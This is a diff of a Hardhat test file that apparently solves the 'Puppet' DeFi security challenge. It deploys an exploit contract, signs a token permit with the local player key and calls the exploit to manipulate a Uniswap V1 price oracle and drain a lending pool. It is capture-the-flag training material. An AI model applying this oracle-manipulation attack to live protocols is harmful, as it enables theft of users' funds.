@@ -1,9 +1,12 @@
 const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
-const { ethers } = require('hardhat');
+const { ethers, config } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
+const { hexlify } = require("@ethersproject/bytes");
+const { recoverAddress } = require("ethers/lib/utils");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -94,7 +97,35 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+        // Swap all tokens into the pool so that they lose value
+        // Adding liquidity won't work since both inputs need to be of the same value
+
+        // Since the tests require a single transaction, the permit() function of the token has to be used instead of approve()
+        decimal = 1n * 10n ** 18n;
+
+        // Technically possible to make it deploy by player and still respect the check, but would have to re-implement in JS getPermitHash
+        Exploit = await (await ethers.getContractFactory('ExploitPuppetV1', deployer)).deploy(token.address, lendingPool.address, uniswapExchange.address);
+
+        // deadline changes each execution making the hash change
+        deadline = (await ethers.provider.getBlock('latest')).timestamp + 150;
+        permitHash = await Exploit.getPermitHash(player.address, Exploit.address, deadline);
+
+        // Need wallet to retrieve the player's private key and sign the digest using signingKey.signDigest()
+        const accounts = config.networks.hardhat.accounts;
+        index = 1; // player index
+        const walletPlayer = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`);
+
+        // Do not use signMessage() since it uses a different standard to build the signature
+        signKey = new ethers.utils.SigningKey(walletPlayer.privateKey);
+        data = ethers.utils.arrayify(permitHash);
+        signature = signKey.signDigest(data);
+
+        recoveredAddress = ethers.utils.recoverAddress( data , signature.compact );
+
+        if (recoveredAddress != player.address) return;
+        
+        await Exploit.connect(player).exploit(deadline, signature.v, signature.r, signature.s, {value: PLAYER_INITIAL_ETH_BALANCE * BigInt(90) / BigInt(100)});
     });
 
     after(async function () {
